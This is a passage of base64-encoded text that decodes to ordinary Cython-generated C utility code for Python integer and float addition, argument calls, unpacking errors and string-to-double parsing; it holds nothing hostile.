ZBUih6ZXJvZGl2aXNpb25fY2hlY2spO1xuICAgIGNvbnN0IGxvbmcgYiA9IGludHZhbDtcbiAgICBsb25nIGEsIHg7XG4jaWZkZWYgSEFWRV9MT05HX0xPTkdcbiAgICBjb25zdCBQWV9MT05HX0xPTkcgbGxiID0gaW50dmFsO1xuICAgIFBZX0xPTkdfTE9ORyBsbGEsIGxseDtcbiNlbmRpZlxuICAgIGlmICh1bmxpa2VseShfX1B5eF9QeUxvbmdfSXNaZXJvKG9wMSkpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYob3AyKTtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KCFfX1B5eF9QeUxvbmdfQ29tcGFjdEFzTG9uZyhvcDEsICZhKSkpIHtcbiAgICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMob3AxKTtcbiAgICAgICAgY29uc3QgUHlfc3NpemVfdCBzaXplID0gX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQob3AxKTtcbiAgICAgICAgc3dpdGNoIChzaXplKSB7XG4gICAgICAgICAgICBjYXNlIC0yOlxuICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICAgICAgICAgYSA9IC0obG9uZykgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAjaWZkZWYgSEFWRV9MT05HX0xPTkdcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKDggKiBzaXplb2YoUFlfTE9OR19MT05HKSAtIDEgPiAyICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgICAgICAgIGxsYSA9IC0oUFlfTE9OR19MT05HKSAoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBnb3RvIGxvbmdfbG9uZztcbiAgICAgICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICAgICAgY2FzZSAyOlxuICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICAgICAgICAgYSA9IChsb25nKSAoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9OR1xuICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoOCAqIHNpemVvZihQWV9MT05HX0xPTkcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICAgICAgICAgbGxhID0gKFBZX0xPTkdfTE9ORykgKCgoKCh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgZ290byBsb25nX2xvbmc7XG4gICAgICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgICAgIGNhc2UgLTM6XG4gICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgICAgICAgICBhID0gLShsb25nKSAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgI2lmZGVmIEhBVkVfTE9OR19MT05HXG4gICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgICAgICAgICBsbGEgPSAtKFBZX0xPTkdfTE9ORykgKCgoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgIGdvdG8gbG9uZ19sb25nO1xuICAgICAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgICAgICBjYXNlIDM6XG4gICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgICAgICAgICBhID0gKGxvbmcpICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAjaWZkZWYgSEFWRV9MT05HX0xPTkdcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKDggKiBzaXplb2YoUFlfTE9OR19MT05HKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgICAgICAgIGxsYSA9IChQWV9MT05HX0xPTkcpICgoKCgoKCh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBnb3RvIGxvbmdfbG9uZztcbiAgICAgICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICAgICAgY2FzZSAtNDpcbiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgICAgICAgIGEgPSAtKGxvbmcpICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9OR1xuICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoOCAqIHNpemVvZihQWV9MT05HX0xPTkcpIC0gMSA+IDQgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICAgICAgICAgbGxhID0gLShQWV9MT05HX0xPTkcpICgoKCgoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgZ290byBsb25nX2xvbmc7XG4gICAgICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgICAgIGNhc2UgNDpcbiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgICAgICAgIGEgPSAobG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgI2lmZGVmIEhBVkVfTE9OR19MT05HXG4gICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgICAgICAgICBsbGEgPSAoUFlfTE9OR19MT05HKSAoKCgoKCgoKCh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgIGdvdG8gbG9uZ19sb25nO1xuICAgICAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgICAgICBkZWZhdWx0OiByZXR1cm4gUHlMb25nX1R5cGUudHBfYXNfbnVtYmVyLT5uYl9hZGQob3AxLCBvcDIpO1xuICAgICAgICB9XG4gICAgfVxuICAgICAgICAgICAgeCA9IGEgKyBiO1xuICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21Mb25nKHgpO1xuI2lmZGVmIEhBVkVfTE9OR19MT05HXG4gICAgbG9uZ19sb25nOlxuICAgICAgICAgICAgbGx4ID0gbGxhICsgbGxiO1xuICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21Mb25nTG9uZyhsbHgpO1xuI2VuZGlmXG4gICAgcmV0dXJuIF9fUHl4X0ZhbGxiYWNrX19fUHl4X1B5TG9uZ19BZGRPYmpDKG9wMSwgb3AyLCBpbnBsYWNlKTtcbiAgICBcbiAgICBcbn1cbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9GbG9hdF9fX1B5eF9QeUxvbmdfQWRkT2JqQyhQeU9iamVjdCAqZmxvYXRfdmFsLCBsb25nIGludHZhbCwgaW50IHplcm9kaXZpc2lvbl9jaGVjaykge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKHplcm9kaXZpc2lvbl9jaGVjayk7XG4gICAgY29uc3QgbG9uZyBiID0gaW50dmFsO1xuICAgIGRvdWJsZSBhID0gX19QeXhfUHlGbG9hdF9BU19ET1VCTEUoZmxvYXRfdmFsKTtcbiAgICAgICAgZG91YmxlIHJlc3VsdDtcbiAgICAgICAgXG4gICAgICAgIHJlc3VsdCA9ICgoZG91YmxlKWEpICsgKGRvdWJsZSliO1xuICAgICAgICByZXR1cm4gUHlGbG9hdF9Gcm9tRG91YmxlKHJlc3VsdCk7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMb25nX0FkZE9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgbG9uZyBpbnR2YWwsIGludCBpbnBsYWNlLCBpbnQgemVyb2RpdmlzaW9uX2NoZWNrKSB7XG4gICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoaW50dmFsKTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUih6ZXJvZGl2aXNpb25fY2hlY2spO1xuICAgICNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFNcbiAgICBpZiAobGlrZWx5KFB5TG9uZ19DaGVja0V4YWN0KG9wMSkpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9VbnBhY2tlZF9fX1B5eF9QeUxvbmdfQWRkT2JqQyhvcDEsIG9wMiwgaW50dmFsLCBpbnBsYWNlLCB6ZXJvZGl2aXNpb25fY2hlY2spO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICBpZiAoUHlGbG9hdF9DaGVja0V4YWN0KG9wMSkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X0Zsb2F0X19fUHl4X1B5TG9uZ19BZGRPYmpDKG9wMSwgaW50dmFsLCB6ZXJvZGl2aXNpb25fY2hlY2spO1xuICAgIH1cbiAgICByZXR1cm4gX19QeXhfRmFsbGJhY2tfX19QeXhfUHlMb25nX0FkZE9iakMob3AxLCBvcDIsIGlucGxhY2UpO1xufVxuI2VuZGlmXG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcpIHtcbiAgICBQeU9iamVjdCAqYXJnc1syXSA9IHtOVUxMLCBhcmd9O1xuICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChmdW5jLCBhcmdzKzEsIDEgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpO1xufVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfUmFpc2VUb29NYW55VmFsdWVzRXJyb3IoUHlfc3NpemVfdCBleHBlY3RlZCkge1xuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19WYWx1ZUVycm9yLFxuICAgICAgICAgICAgICAgICAidG9vIG1hbnkgdmFsdWVzIHRvIHVucGFjayAoZXhwZWN0ZWQgJSIgQ1lUSE9OX0ZPUk1BVF9TU0laRV9UICJkKSIsIGV4cGVjdGVkKTtcbn1cblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X1JhaXNlTmVlZE1vcmVWYWx1ZXNFcnJvcihQeV9zc2l6ZV90IGluZGV4KSB7XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1ZhbHVlRXJyb3IsXG4gICAgICAgICAgICAgICAgICJuZWVkIG1vcmUgdGhhbiAlIiBDWVRIT05fRk9STUFUX1NTSVpFX1QgImQgdmFsdWUlLjFzIHRvIHVucGFjayIsXG4gICAgICAgICAgICAgICAgIGluZGV4LCAoaW5kZXggPT0gMSkgPyAiIiA6ICJzIik7XG59XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0l0ZXJGaW5pc2godm9pZCkge1xuICAgIFB5T2JqZWN0KiBleGNfdHlwZTtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIGV4Y190eXBlID0gX19QeXhfUHlFcnJfQ3VycmVudEV4Y2VwdGlvblR5cGUoKTtcbiAgICBpZiAodW5saWtlbHkoZXhjX3R5cGUpKSB7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV4Y190eXBlLCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkpXG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgIF9fUHl4X1B5RXJyX0NsZWFyKCk7XG4gICAgICAgIHJldHVybiAwO1xuICAgIH1cbiAgICByZXR1cm4gMDtcbn1cblxuXG5zdGF0aWMgaW50IF9fUHl4X0l0ZXJuZXh0VW5wYWNrRW5kQ2hlY2soUHlPYmplY3QgKnJldHZhbCwgUHlfc3NpemVfdCBleHBlY3RlZCkge1xuICAgIGlmICh1bmxpa2VseShyZXR2YWwpKSB7XG4gICAgICAgIFB5X0RFQ1JFRihyZXR2YWwpO1xuICAgICAgICBfX1B5eF9SYWlzZVRvb01hbnlWYWx1ZXNFcnJvcihleHBlY3RlZCk7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X0l0ZXJGaW5pc2goKTtcbn1cblxuXG5zdGF0aWMgZG91YmxlIF9fUHl4X1Nsb3dQeVN0cmluZ19Bc0RvdWJsZShQeU9iamVjdCAqb2JqKSB7XG4gICAgUHlPYmplY3QgKmZsb2F0X3ZhbHVlID0gUHlGbG9hdF9Gcm9tU3RyaW5nKG9iaik7XG4gICAgaWYgKGxpa2VseShmbG9hdF92YWx1ZSkpIHtcbiAgICAgICAgZG91YmxlIHZhbHVlID0gX19QeXhfUHlGbG9hdF9BU19ET1VCTEUoZmxvYXRfdmFsdWUpO1xuICAgICAgICBQeV9ERUNSRUYoZmxvYXRfdmFsdWUpO1xuICAgICAgICByZXR1cm4gdmFsdWU7XG4gICAgfVxuICAgIHJldHVybiAoZG91YmxlKS0xO1xufVxuc3RhdGljIGNvbnN0IGNoYXIqIF9fUHl4X19QeUJ5dGVzX0FzRG91YmxlX0NvcHkoY29uc3QgY2hhciogc3RhcnQsIGNoYXIqIGJ1ZmZlciwgUHlfc3NpemVfdCBsZW5ndGgpIHtcbiAgICBpbnQgbGFzdF93YXNfcHVuY3R1YXRpb24gPSAxO1xuICAgIGludCBwYXJzZV9lcnJvcl9mb3VuZCA9IDA7XG4gICAgUHlfc3NpemVfdCBpO1xuICAgIGZvciAoaT0wOyBpIDwgbGVuZ3RoOyBpKyspIHtcbiAgICAgICAgY2hhciBjaHIgPSBzdGFydFtpXTtcbiAgICAgICAgaW50IGlzX3B1bmN0dWF0aW9uID0gKGNociA9PSBcJ19cJykgfCAoY2hyID09IFwnLlwnKSB8IChjaHIgPT0gXCdlXCcpIHwgKGNociA9PSBcJ0VcJyk7XG4gICAgICAgICpidWZmZXIgPSBjaHI7XG4gICAgICAgIGJ1ZmZlciArPSAoY2hyICE9IFwnX1wnKTtcbiAgICAgICAgcGFyc2VfZXJyb3JfZm91bmQgfD0gbGFzdF93YXNfcHVuY3R1YXRpb24gJiBpc19wdW5jdHVhdGlvbjtcbiAgICAgICAgbGFzdF93YXNfcHVuY3R1YXRpb24gPSBpc19wdW5jdHVhdGlvbjtcbiAgICB9XG4gICAgcGFyc2VfZXJyb3JfZm91bmQgfD0gbGFzdF93YXNfcHVuY3R1YXRpb247XG4gICAgKmJ1ZmZlciA9IFwnXFwwXCc7XG4gICAgcmV0dXJuIHVubGlrZWx5KHBhcnNlX2Vycm9yX2ZvdW5kKSA/IE5VTEwgOiBidWZmZXI7XG59XG5zdGF0aWMgZG91YmxlIF9fUHl4X19QeUJ5dGVzX0FzRG91YmxlX2luZl9uYW4oY29uc3QgY2hhciogc3RhcnQsIFB5X3NzaXplX3QgbGVuZ3RoKSB7XG4gICAgaW50IG1hdGNoZXMgPSAxO1xuICAgIGNoYXIgc2lnbiA9IHN0YXJ0WzBdO1xuICAgIGludCBpc19zaWduZWQgPSAoc2lnbiA9PSBcJytcJykgfCAoc2lnbiA9PSBcJy1cJyk7XG4gICAgc3RhcnQgKz0gaXNfc2lnbmVkO1xuICAgIGxlbmd0aCAtPSBpc19zaWduZWQ7XG4gICAgc3dpdGNoIChzdGFydFswXSkge1xuICAgICAgICAjaWZkZWYgUHlfTkFOXG4gICAgICAgIGNhc2UgXCduXCc6XG4gICAgICAgIGNhc2UgXCdOXCc6XG4gICAgICAgICAgICBpZiAodW5saWtlbHkobGVuZ3RoICE9IDMpKSBnb3RvIHBhcnNlX2ZhaWx1cmU7XG4gICAgICAgICAgICBtYXRjaGVzICY9IChzdGFydFsxXSA9PSBcJ2FcJyB8fCBzdGFydFsxXSA9PSBcJ0FcJyk7XG4gICAgICAgICAgICBtYXRjaGVzICY9IChzdGFydFsyXSA9PSBcJ25cJyB8fCBzdGFydFsyXSA9PSBcJ05cJyk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIW1hdGNoZXMpKSBnb3RvIHBhcnNlX2ZhaWx1cmU7XG4gICAgICAgICAgICByZXR1cm4gKHNpZ24gPT0gXCctXCcpID8gLVB5X05BTiA6IFB5X05BTjtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGNhc2UgXCdpXCc6XG4gICAgICAgIGNhc2UgXCdJXCc6XG4gICAgICAgICAgICBpZiAodW5saWtlbHkobGVuZ3RoIDwgMykpIGdvdG8gcGFyc2VfZmFpbHVyZTtcbiAgICAgICAgICAgIG1hdGNoZXMgJj0gKHN0YXJ0WzFdID09IFwnblwnIHx8IHN0YXJ0WzFdID09IFwnTlwnKTtcbiAgICAgICAgICAgIG1hdGNoZXMgJj0gKHN0YXJ0WzJdID09IFwnZlwnIHx8IHN0YXJ0WzJdID09IFwnRlwnKTtcbiAgICAgICAgICAgIGlmIChsaWtlbHkobGVuZ3RoID09IDMgJiYgbWF0Y2hlcykpXG4gICAgICAgICAgICAgICAgcmV0dXJuIChzaWduID09IFwnLVwnKSA/IC1QeV9IVUdFX1ZBTCA6IFB5X0hVR0VfVkFMO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KGxlbmd0aCAhPSA4KSkgZ290byBwYXJzZV9mYWlsdXJlO1xuICAgICAgICAgICAgbWF0Y2hlcyAmPSAoc3RhcnRbM10gPT0gXCdpXCcgfHwgc3RhcnRbM10gPT0gXCdJXCcpO1xuICAgICAgICAgICAgbWF0Y2hlcyAmPSAoc3RhcnRbNF0gPT0gXCduXCcgfHwgc3RhcnRbNF0gPT0gXCdOXCcpO1xuICAgICAgICAgICAgbWF0Y2hlcyAmPSAoc3RhcnRbNV0gPT0gXCdpXCcgfHwgc3RhcnRbNV0gPT0gXCdJXCcpO1xuICAgICAgICAgICAgbWF0Y2hlcyAmPSAoc3RhcnRbNl0gPT0gXCd0XCcgfHwgc3RhcnRbNl0gPT0gXCdUXCcpO1xuICAgICAgICAgICAgbWF0Y2hlcyAmPSAoc3RhcnRbN10gPT0gXCd5XCcgfHwgc3RhcnRbN10gPT0gXCdZXCcpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFtYXRjaGVzKSkgZ290byBwYXJzZV9mYWlsdXJlO1xuICAgICAgICAgICAgcmV0dXJuIChzaWduID09IFwnLVwnKSA/IC1QeV9IVUdFX1ZBTCA6IFB5X0hVR0VfVkFMO1xuICAgICAgICBjYXNlIFwnLlwnOiBjYXNlIFwnMFwnOiBjYXNlIFwnMVwnOiBjYXNlIFwnMlwnOiBjYXNlIFwnM1wnOiBjYXNlIFwnNFwnOiBjYXNlIFwnNVwnOiBjYXNlIFwnNlwnOiBjYXNlIFwnN1wnOiBjYXNlIFwnOFwnOiBjYXNlIFwnOVwnOlxuICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgIGRlZmF1bHQ6XG4gICAgICAgICAgICBnb3RvIHBhcnNlX2ZhaWx1cmU7XG4gICAgfVxuICAgIHJldHVybiAwLjA7XG5wYXJzZV9mYWlsdXJlOlxuICAgIHJldHVybiAtMS4wO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X19QeUJ5dGVzX0FzRG91YmxlX0lzU3BhY2UoY2hhciBjaCkge1xuICAgIHJldHVybiAoY2ggPT0gMHgyMCkgfCAhKChjaCA8IDB4OSkgfCAoY2ggPiAweGQpKTtcbn1cbkNZVEhPTl9VTlVTRUQgc3RhdGljIGRvdWJsZSBfX1B5eF9fUHlCeXRlc19Bc0RvdWJsZShQeU9iamVjdCAqb2JqLCBjb25zdCBjaGFyKiBzdGFydCwgUHlfc3NpemVfdCBsZW5ndGgpIHtcbiAgICBkb3VibGUgdmFsdWU7XG4gICAgUHlfc3NpemVfdCBpLCBkaWdpdHM7XG4gICAgY29uc3QgY2hhciAqbGFzdCA9IHN0YXJ0ICsgbGVuZ3RoO1xuICAgIGNoYXIgKmVuZDtcbiAgICB3aGlsZSAoX19QeXhfX1B5Qnl0ZXNfQXNEb3VibGVfSXNTcGFjZSgqc3RhcnQpKVxuICAgICAgICBzdGFydCsrO1xuICAgIHdoaWxlIChzdGFydCA8IGxhc3QgLSAxICYmIF9fUHl4X19QeUJ5dGVzX0FzRG91YmxlX0lzU3BhY2UobGFzdFstMV0pKVxuICAgICAgICBsYXN0LS07XG4gICAgbGVuZ3RoID0gbGFzdCAtIHN0YXJ0O1xuICAgIGlmICh1bmxpa2VseShsZW5ndGggPD0gMCkpIGdvdG8gZmFsbGJhY2s7XG4gICAgdmFsdWUgPSBfX1B5eF9fUHlCeXRlc19Bc0RvdWJsZV9pbmZfbmFuKHN0YXJ0LCBsZW5ndGgpO1xuICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSAtMS4wKSkgZ290byBmYWxsYmFjaztcbiAgICBpZiAodmFsdWUgIT0gMC4wKSByZXR1cm4gdmFsdWU7XG4gICAgZGlnaXRzID0gMDtcbiAgICBmb3IgKGk9MDsgaSA8IGxlbmd0aDsgZGlnaXRzICs9IHN0YXJ0W2krK10gIT0gXCdfXCcpO1xuICAgIGlmIChsaWtlbHkoZGlnaXRzID09IGxlbmd0aCkpIHtcbiAgICAgICAgdmFsdWUgPSBQeU9TX3N0cmluZ190b19kb3VibGUoc3RhcnQsICZlbmQsIE5VTEwpO1xuICAgIH0gZWxzZSBpZiAoZGlnaXRzIDwgNDApIHtcbiAgICAgICAgY2hhciBudW1iZXJbNDBdO1xuICAgICAgICBsYXN0ID0gX19QeXhfX1B5Qnl0ZXNfQXNEb3VibGVfQ29weShzdGFydCwgbnVtYmVyLCBsZW5ndGgpO1xuICAgICAgICBpZiAodW5saWtlbHkoIWxhc3QpKSBnb3RvIGZhbGxiYWNrO1xuICAgICAgICB2YWx1ZSA9IFB5T1Nfc3RyaW5nX3RvX2RvdWJsZShudW1iZXIsICZlbmQsIE5VTEwpO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIGNoYXIgKm51bWJlciA9IChjaGFyKikgUHlNZW1fTWFsbG9jKChkaWdpdHMgKyAxKSAqIHNpemVvZihjaGFyKSk7XG4gICAgICAgIGlmICh1bmxpa2VseSghbnVtYmVyKSkgZ290byBmYWxsYmFjaztcbiAgICAgICAgbGFzdCA9IF9fUHl4X19QeUJ5dGVzX0FzRG91YmxlX0NvcHkoc3RhcnQsIG51bWJlciwgbGVuZ3RoKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFsYXN0KSkge1xuICAgICAgICAgICAgUHlNZW1fRnJlZShudW1iZXIpO1xuICAgICAgICAgICAgZ290byBmYWxsYmFjaztcbiAgICAgICAgfVxuICAgICAgICB2YWx1ZSA9IFB5T1Nfc3RyaW5nX3RvX2RvdWJsZShudW1iZXIsICZlbmQsIE5VTEwpO1xuICAgICAgICBQeU1lbV9GcmVlKG51bWJlcik7XG4gICAgfVxuICAgIGlmIChsaWtlbHkoZW5kID09IGxhc3QpIHx8ICh2YWx1ZSA9PSAoZG91YmxlKS0xICYmIFB5RXJyX09jY3VycmVkKCkpKSB7XG4gICAgICAgIHJldHVybiB2YWx1ZTtcbiAgICB9XG5mYWxsYmFjazpcbiAgICByZXR1cm4gX19QeXhfU2xvd1B5U3RyaW5nX0FzRG91YmxlKG9iaik7XG59XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X19QeU51bWJlcl9GbG9hdChQeU9iamVjdCogb2JqKSB7XG4gICAgZG91YmxlIHZhbDtcbiAgICBpZiAoUHlMb25nX0NoZWNrRXhhY3Qob2JqKSkge1xuI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAgICAgICBpZiAobGlrZWx5KF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3Qob2JqKSkpIHtcbiAgICAgICAgICAgIHZhbCA9IChkb3VibGUpIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWUob2JqKTtcbiAgICAgICAgICAgIGdvdG8gbm9fZXJyb3I7XG4gICAgICAgIH1cbiNlbmRpZlxuICAgICAgICB2YWwgPSBQeUxvbmdfQXNEb3VibGUob2JqKTtcbiAgICB9IGVsc2UgaWYgKFB5VW5pY29kZV9DaGVja0V4YWN0KG9i